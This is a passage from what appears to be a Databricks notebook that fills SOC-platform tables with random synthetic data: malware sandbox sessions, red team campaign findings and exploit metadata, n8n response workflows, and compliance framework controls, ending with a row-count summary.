    StructField("network_source_ip",StringType()),StructField("network_dest_ip",StringType()),
    StructField("malware_family",StringType()),StructField("threat_category",StringType()),StructField("severity",StringType()),
    StructField("is_packed",BooleanType()),StructField("packer_type",StringType()),StructField("anti_analysis_detected",BooleanType()),
    StructField("yara_matches",StringType()),StructField("static_analysis_complete",BooleanType()),
    StructField("sandbox_status",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("malware_samples")

spark.createDataFrame(sessions_data, StructType([
    StructField("id",StringType()),StructField("sample_id",StringType()),StructField("session_name",StringType()),
    StructField("environment_type",StringType()),StructField("vm_id",StringType()),
    StructField("execution_start",StringType()),StructField("execution_end",StringType()),
    StructField("execution_duration_seconds",IntegerType()),StructField("session_status",StringType()),
    StructField("detonation_method",StringType()),StructField("network_allowed",BooleanType()),
    StructField("internet_simulation",BooleanType()),StructField("artifacts_captured",IntegerType()),
    StructField("screenshots_captured",IntegerType()),StructField("memory_dumps",IntegerType()),
    StructField("pcap_file_size",IntegerType()),StructField("ai_analysis_complete",BooleanType()),
    StructField("threat_score",FloatType()),StructField("confidence_score",FloatType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("sandbox_sessions")

print(f"Created {len(samples_data)} malware samples, {len(sessions_data)} sandbox sessions")
```

---

## Cell 10 - Red Team Campaigns

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Red Team Automation

# COMMAND ----------

RT_CAMPAIGNS = [
    ("Operation Nightfall","red_team","External network perimeter assessment with AI-driven exploitation","owasp"),
    ("Project Chimera","internal","Internal lateral movement and privilege escalation testing","ptes"),
    ("CloudStrike Assessment","web_app","Cloud infrastructure and API security assessment","owasp"),
    ("Social Viper","social","Social engineering and phishing simulation campaign","custom"),
    ("Zero Trust Audit","api","Zero trust architecture penetration test","ptes"),
    ("Ransomware Resilience","red_team","Full ransomware attack simulation end-to-end","custom"),
    ("Supply Chain Probe","external","Third-party integration and supply chain security","osstmm"),
    ("Insider Simulation","internal","Simulated insider threat with escalating privileges","custom"),
]

campaigns_data = []
findings_data = []
exploits_data = []

for cname, ctype, scope, methodology in RT_CAMPAIGNS:
    camp_id = uid()
    ts = rand_ts(720)
    critical = random.randint(1, 8)
    high = random.randint(3, 15)
    medium = random.randint(5, 20)
    low = random.randint(5, 25)
    total = critical + high + medium + low

    campaigns_data.append((
        camp_id, cname, ctype, scope, methodology,
        random.choice(["semi_auto","ai_autonomous","manual"]),
        random.choice(["databricks-dbrx-instruct","gpt-4","claude-3-opus"]),
        ts.isoformat(), (ts + timedelta(days=random.randint(3,14))).isoformat(),
        random.choice(["completed","in_progress","completed","completed"]),
        random.randint(10, 50), total, critical, high, medium, low,
        random.randint(critical, total),
        round(random.uniform(50, 95), 2),
        NOW.isoformat()
    ))

    VULN_NAMES = ["SQL Injection","Cross-Site Scripting (XSS)","Remote Code Execution","Privilege Escalation","SSRF","IDOR","Broken Authentication","API Key Exposure","Insecure Deserialization","Path Traversal","Command Injection","LDAP Injection","XXE","CSRF","Open Redirect"]
    for _ in range(total):
        finding_id = uid()
        sev = random.choices(SEVERITIES, weights=[low,medium,high,critical])[0]
        exploited = random.random() > 0.4
        findings_data.append((
            finding_id, camp_id, random.choice(VULN_NAMES),
            f"CVE-{random.randint(2020,2024)}-{random.randint(1000,50000)}" if random.random() > 0.5 else "",
            round(random.uniform(3.0, 10.0), 1), sev,
            random.choice(["vulnerability","misconfiguration","weakness","exposure"]),
            random.choice(["injection","broken_auth","sensitive_data","broken_access","misconfig"]),
            exploited,
            random.choice(["scanner","agent","manual","ai_generated"]),
            rand_ts(168).isoformat(), NOW.isoformat()
        ))

        if exploited:
            exploits_data.append((
                uid(), camp_id, finding_id,
                random.choice(["Metasploit Module","Custom Python Exploit","AI-Generated Payload","Manual Technique"]),
                random.choice(["remote","local","web","client_side"]),
                random.choice(["metasploit","exploit_db","custom","ai_generated"]),
                True,
                random.choice(["user","admin","system","root"]),
                random.choice([True,False]), random.choice([True,False]), random.choice([True,False,False]),
                rand_ts(168).isoformat(), NOW.isoformat()
            ))

spark.createDataFrame(campaigns_data, StructType([
    StructField("id",StringType()),StructField("campaign_name",StringType()),StructField("campaign_type",StringType()),
    StructField("scope",StringType()),StructField("methodology",StringType()),
    StructField("automation_level",StringType()),StructField("agent_model",StringType()),
    StructField("start_time",StringType()),StructField("end_time",StringType()),StructField("status",StringType()),
    StructField("targets_count",IntegerType()),StructField("vulnerabilities_found",IntegerType()),
    StructField("critical_findings",IntegerType()),StructField("high_findings",IntegerType()),
    StructField("medium_findings",IntegerType()),StructField("low_findings",IntegerType()),
    StructField("exploited_count",IntegerType()),StructField("risk_score",FloatType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("pentest_campaigns")

spark.createDataFrame(findings_data, StructType([
    StructField("id",StringType()),StructField("campaign_id",StringType()),StructField("vulnerability_name",StringType()),
    StructField("cve_id",StringType()),StructField("cvss_score",FloatType()),StructField("severity",StringType()),
    StructField("finding_type",StringType()),StructField("category",StringType()),
    StructField("exploited",BooleanType()),StructField("discovered_by",StringType()),
    StructField("discovered_at",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("pentest_findings")

spark.createDataFrame(exploits_data, StructType([
    StructField("id",StringType()),StructField("campaign_id",StringType()),StructField("finding_id",StringType()),
    StructField("exploit_name",StringType()),StructField("exploit_type",StringType()),
    StructField("exploit_source",StringType()),StructField("success",BooleanType()),
    StructField("privileges_gained",StringType()),StructField("persistence_established",BooleanType()),
    StructField("lateral_movement",BooleanType()),StructField("detection_evaded",BooleanType()),
    StructField("attempt_time",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("pentest_exploits")

print(f"Created {len(campaigns_data)} campaigns, {len(findings_data)} findings, {len(exploits_data)} exploits")
```

---

## Cell 11 - N8N Workflows & Response Actions

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Workflow Automation & Response Actions

# COMMAND ----------

WORKFLOWS = [
    ("Auto-Isolate Compromised Host","response","Automatically isolates hosts when C2 beacon is detected",True),
    ("Threat Intel IOC Enrichment","investigation","Enriches IOCs through VirusTotal, Shodan, passive DNS",True),
    ("Phishing Email Quarantine","response","Quarantines reported phishing emails and blocks sender domain",True),
    ("Slack Alert Notification","notification","Posts critical alerts to #security-incidents Slack channel",True),
    ("JIRA Ticket Creation","investigation","Creates JIRA tickets for high/critical alerts with full context",True),
    ("Forensic Snapshot Automation","investigation","Triggers forensic disk and memory snapshots on compromised hosts",True),
    ("User Account Lockout","remediation","Disables compromised user accounts and revokes active sessions",True),
    ("Firewall Rule Deployment","response","Pushes IOC-based firewall rules to Palo Alto NGFW",True),
    ("Executive Threat Briefing","notification","Generates daily executive threat briefing email to CISO",True),
    ("Ransomware Containment","response","Isolates network segment and triggers backup verification",True),
    ("Cloud IAM Remediation","remediation","Revokes excessive IAM permissions detected by CSPM",False),
    ("Vulnerability Scan Trigger","investigation","Triggers Nessus scan when new critical CVE affects assets",True),
]

workflows_data = []
executions_data = []
response_data = []

for wname, wtype, desc, enabled in WORKFLOWS:
    wf_id = uid()
    workflows_data.append((
        wf_id, wname, desc, f"https://n8n.internal.company.com/webhook/{uid()[:8]}",
        f"wf_{random.randint(100,999)}", wtype, enabled,
        json.dumps({"retries": 3, "timeout_seconds": 300, "concurrent": False}),
        "header", NOW.isoformat()
    ))

    for _ in range(random.randint(10, 60)):
        exec_id = uid()
        ts = rand_ts(168)
        status = random.choices(["success","success","success","failed","timeout"], weights=[60,20,5,10,5])[0]
        duration = random.randint(500, 30000)
        executions_data.append((
            exec_id, wf_id, status,
            json.dumps({"alert_id": uid(), "severity": random.choice(SEVERITIES)}),
            json.dumps({"actions_taken": random.randint(1,5), "success": status == "success"}),
            "" if status == "success" else f"Execution {status}: timeout after {duration}ms",
            duration,
            ts.isoformat(), (ts + timedelta(milliseconds=duration)).isoformat(), NOW.isoformat()
        ))

        if status == "success":
            response_data.append((
                uid(), exec_id,
                random.choice(["block_ip","isolate_user","disable_account","quarantine_file","send_notification","create_ticket"]),
                random.choice([random.choice(C2_IPS), random.choice(USERS), random.choice(HOSTNAMES)]),
                json.dumps({"method": "API", "target_system": random.choice(["CrowdStrike","Palo Alto","Active Directory","ServiceNow"])}),
                "completed", "Action executed successfully.", True,
                NOW.isoformat()
            ))

spark.createDataFrame(workflows_data, StructType([
    StructField("id",StringType()),StructField("name",StringType()),StructField("description",StringType()),
    StructField("n8n_webhook_url",StringType()),StructField("n8n_workflow_id",StringType()),
    StructField("workflow_type",StringType()),StructField("enabled",BooleanType()),
    StructField("configuration",StringType()),StructField("auth_method",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("n8n_workflows")

spark.createDataFrame(executions_data, StructType([
    StructField("id",StringType()),StructField("workflow_id",StringType()),StructField("execution_status",StringType()),
    StructField("trigger_data",StringType()),StructField("response_data",StringType()),
    StructField("error_message",StringType()),StructField("execution_time_ms",IntegerType()),
    StructField("started_at",StringType()),StructField("completed_at",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("workflow_executions")

spark.createDataFrame(response_data, StructType([
    StructField("id",StringType()),StructField("execution_id",StringType()),StructField("action_type",StringType()),
    StructField("target_entity",StringType()),StructField("action_details",StringType()),
    StructField("action_status",StringType()),StructField("result_message",StringType()),
    StructField("rollback_possible",BooleanType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("response_actions")

print(f"Created {len(workflows_data)} workflows, {len(executions_data)} executions, {len(response_data)} response actions")
```

---

## Cell 12 - Compliance Frameworks

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Compliance & Governance

# COMMAND ----------

FRAMEWORKS = [
    ("NIST CSF 2.0","nist","National Institute of Standards and Technology Cybersecurity Framework","2.0",6),
    ("ISO 27001:2022","iso","Information Security Management System international standard","2022",14),
    ("PCI DSS 4.0","pci","Payment Card Industry Data Security Standard","4.0",12),
    ("SOC 2 Type II","soc2","Service Organization Control 2 Trust Service Criteria","2023",5),
    ("HIPAA","hipaa","Health Insurance Portability and Accountability Act","2023",3),
    ("GDPR","gdpr","General Data Protection Regulation","2018",8),
    ("CIS Controls v8","cis","Center for Internet Security Critical Security Controls","8.0",18),
    ("MITRE ATT&CK","mitre","Adversarial Tactics Techniques and Common Knowledge","14.0",14),
]

frameworks_data = []
controls_data = []
assessments_data = []

for fname, fid, fdesc, fver, num_controls in FRAMEWORKS:
    fw_id = uid()
    frameworks_data.append((
        fw_id, fname, fid, fdesc, fver,
        random.choice(["mandatory","recommended","mandatory"]),
        round(random.uniform(65, 98), 1),
        num_controls, NOW.isoformat()
    ))

    for j in range(num_controls):
        ctrl_id = uid()
        compliance_pct = round(random.uniform(50, 100), 1)
        controls_data.append((
            ctrl_id, fw_id, f"{fid.upper()}-{j+1:03d}",
            f"Control {j+1}: {random.choice(['Access Control','Data Protection','Incident Response','Risk Assessment','Security Monitoring','Encryption','Authentication','Logging','Network Segmentation','Vulnerability Management'])}",
            random.choice(["compliant","partially_compliant","non_compliant","not_applicable"]),
            compliance_pct,
            random.choice(["automated","manual","hybrid"]),
            rand_ts(90).isoformat(), NOW.isoformat()
        ))

    assessments_data.append((
        uid(), fw_id, f"Q{random.randint(1,4)} {2024} Assessment",
        random.choice(["completed","in_progress"]),
        round(random.uniform(70, 95), 1),
        random.randint(0, 5), random.randint(0, 10),
        random.choice(USERS),
        rand_ts(90).isoformat(), NOW.isoformat()
    ))

spark.createDataFrame(frameworks_data, StructType([
    StructField("id",StringType()),StructField("name",StringType()),StructField("framework_id",StringType()),
    StructField("description",StringType()),StructField("version",StringType()),
    StructField("requirement_level",StringType()),StructField("overall_compliance_pct",FloatType()),
    StructField("total_controls",IntegerType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("compliance_frameworks")

spark.createDataFrame(controls_data, StructType([
    StructField("id",StringType()),StructField("framework_id",StringType()),StructField("control_id",StringType()),
    StructField("control_name",StringType()),StructField("status",StringType()),
    StructField("compliance_pct",FloatType()),StructField("verification_method",StringType()),
    StructField("last_assessed",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("compliance_controls")

spark.createDataFrame(assessments_data, StructType([
    StructField("id",StringType()),StructField("framework_id",StringType()),StructField("assessment_name",StringType()),
    StructField("status",StringType()),StructField("overall_score",FloatType()),
    StructField("critical_gaps",IntegerType()),StructField("total_gaps",IntegerType()),
    StructField("assessor",StringType()),StructField("assessed_at",StringType()),StructField("created_at",StringType())
])).write.format("delta").mode("overwrite").saveAsTable("compliance_assessments")

print(f"Created {len(frameworks_data)} frameworks, {len(controls_data)} controls, {len(assessments_data)} assessments")
```

---

## Cell 13 - Summary & Verification

```python
# COMMAND ----------
# MAGIC %md
# MAGIC ## Verification - Row Counts

# COMMAND ----------

tables = [
    "events","alerts","cases","case_comments","case_timeline",
    "threat_feeds","iocs","correlation_rules","correlation_rule_matches",
    "ai_agents","agent_tasks","user_profiles","user_behavior_events",
    "malware_samples","sandbox_sessions",
    "pentest_campaigns","pentest_findings","pentest_exploits",
    "n8n_workflows","workflow_executions","response_actions",
    "compliance_frameworks","compliance_controls","compliance_assessments"
]

print("=" * 60)
print("SOC INTELLIGENCE PLATFORM - DATA POPULATION SUMMARY")
print("=" * 60)
total = 0
for t in tables:
    try:
        count = spark.table(t).count()
        total += count
        print(f"  {t:40s} {count:>8,d} rows")
    except Exception as e:
        print(f"  {t:40s} ERROR: {e}")
print("-" * 60)
print(f"  {'TOTAL':40s} {total:>8,d} rows")
print("=" * 60)
```
